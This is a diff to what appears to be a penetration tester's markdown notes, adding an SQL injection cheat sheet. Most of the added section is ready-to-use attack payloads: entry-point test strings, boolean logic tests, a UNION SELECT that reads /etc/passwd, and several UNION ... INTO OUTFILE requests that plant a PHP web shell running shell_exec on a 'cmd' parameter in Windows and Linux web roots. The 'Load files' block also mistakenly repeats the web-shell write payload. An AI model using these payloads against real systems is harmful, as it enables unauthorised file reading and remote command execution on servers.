@@ -339,4 +339,90 @@ ffuf -w test_methods.txt -u https://ip/endpoint_name/v1/user/change_password -X 
 * No error mean that this particular method worked
 * particularly here admin password might have been changed
 
-## JWT
+
+
+
+## SQL injection
+
+Connect
+
+`mysql -u root -p'pass' -h ip`
+
+A very nice cheat sheet is provided by Portswigger: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+
+### Test for SQLi vulnerability
+* It is necessary to identify a possible SQLi entry point
+* Use of special characters can help (got from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)):
+
+```bash
+'
+%27
+"
+%22
+#
+%23
+;
+%3B
+)
+Wildcard (*)
+&apos;  # required for XML content
+
+Multiple encoding
+
+%%2727
+%25%27
+
+Merging characters
+
+`+HERP
+'||'DERP
+'+'herp
+' 'DERP
+'%20'HERP
+'%2B'HERP
+
+Logic Testing
+
+page.asp?id=1 or 1=1 -- true
+page.asp?id=1' or 1=1 -- true
+page.asp?id=1" or 1=1 -- true
+page.asp?id=1 and 1=2 -- false
+
+Weird characters
+
+Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
+transformed into U+0022 QUOTATION MARK (")
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+transformed into U+0027 APOSTROPHE (')
+```
+
+
+### MYSQL Comments
+-- - Note the space after the double dash
+/* MYSQL Comment */
+/*! MYSQL Special SQL */
+/*!32302 10*/ Comment for MYSQL version 3.23.02
+
+-- - to emphasize space
+
+### Load files using SQLi
+```bash
+UNION SELECT 1, load_file(/etc/passwd) #
+
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+```
+
+### Write files using SQLi
+
+```bash
+
+#dont forget to encode
+
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+```
